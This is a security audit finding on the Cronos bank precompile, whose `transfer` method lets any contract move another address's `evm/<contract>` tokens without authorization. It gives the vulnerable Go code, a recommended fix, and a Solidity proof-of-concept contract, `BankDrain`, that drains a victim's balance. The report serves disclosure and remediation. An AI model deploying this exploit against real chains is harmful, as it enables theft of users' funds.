### Title
Bank Precompile `transfer` Executes Unauthorized Native Token Transfers Without Sender Authorization - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The `BankContract.Run` handler for the `transfer` method in the Cronos bank precompile accepts a caller-supplied `sender` address and immediately executes `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that the calling contract is authorized to move tokens on behalf of that sender. Any unprivileged contract can drain `evm/<calling_contract>` native tokens from any address that holds them.

### Finding Description
`BankContract.Run` in `x/cronos/keeper/precompiles/bank.go` handles the `transfer` method as follows:

```go
sender    := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
from      := sdk.AccAddress(sender.Bytes())
to        := sdk.AccAddress(recipient.Bytes())
denom     := EVMDenom(contract.Caller()) // "evm/<calling_contract>"
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The denom is correctly scoped to `contract.Caller()`, but the `sender` (i.e., `from`) is taken verbatim from the call arguments. There is no guard of the form `require sender == contract.Caller()` or any allowance/approval check. The `TestBank.sol` reference implementation passes `msg.sender` as the sender by convention:

```solidity
function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return bank.transfer(msg.sender, recipient, amount);  // convention only, not enforced
}
``` [2](#0-1) 

Nothing in the precompile enforces this convention. A malicious contract can pass any victim address as `sender`.

### Impact Explanation
`evm/<contract>` tokens are native Cosmos bank tokens created and managed exclusively through the bank precompile. They are the native-side representation of CRC21 balances (e.g., produced when a user calls `moveToNative`). An attacker contract can call `bank.transfer(victim, attacker, victim_balance)` and `bankKeeper.SendCoins` will execute the transfer unconditionally, constituting an unauthorized balance change for precompile-controlled assets. This maps directly to the Critical impact class: *"Unauthorized transfer … for … precompile-controlled assets."*

### Likelihood Explanation
The attacker only needs to deploy a contract — no admin key, no governance vote, no validator access. The attack is reachable from any unprivileged EVM transaction. A realistic scenario:

1. A legitimate CRC21-style contract mints `evm/<contract>` tokens to users who call `moveToNative`.
2. If that contract is malicious (or later upgraded to be malicious), it calls `bank.transfer(user, attacker, balance)` in the same or a subsequent transaction, draining every user's native balance without their consent.

### Recommendation
Enforce that the `sender` argument equals `contract.Caller()` before executing the transfer:

```go
case TransferMethodName:
    // ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the calling contract")
    }
```

Alternatively, remove the `sender` argument entirely and always use `contract.Caller()` as the source, mirroring how `mint`/`burn` already derive the denom from `contract.Caller()` without accepting an arbitrary address. [3](#0-2) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BankDrain {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<this> tokens to victim (e.g. as part of a "reward" flow)
    function seed(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<this> balance to attacker — no victim signature required
    function drain(address victim, address attacker, uint256 amount) external {
        // bank precompile accepts victim as sender without any authorization check
        bank.transfer(victim, attacker, amount);
    }
}
```

`drain` succeeds because `BankContract.Run` calls `bankKeeper.SendCoins(ctx, victim, attacker, ...)` with no check that `victim == contract.Caller()`. [4](#0-3)
